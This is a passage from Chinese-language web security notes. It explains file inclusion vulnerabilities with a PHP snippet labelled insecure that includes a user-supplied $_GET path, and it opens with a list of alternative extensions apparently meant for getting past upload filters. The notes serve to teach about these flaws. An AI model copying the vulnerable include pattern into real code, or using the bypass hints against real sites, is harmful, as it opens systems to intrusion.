可以尝试**`php1、php2、php3、phtml、ashx`**等



### 文件包含

**文件包含漏洞**是一种常见的 Web 安全漏洞，主要出现在 PHP、JSP、ASP 等动态网页开发语言中。它的核心问题是：**程序在引入（包含）一个文件时，文件路径可以由用户（攻击者）控制，且程序没有做充分的安全检查**。



~~~php
// 不安全的写法
$page = $_GET['page'];
include("$page");
~~~

include里的文件**后缀不管是什么**，内部的**php代码**都被会当成php执行。
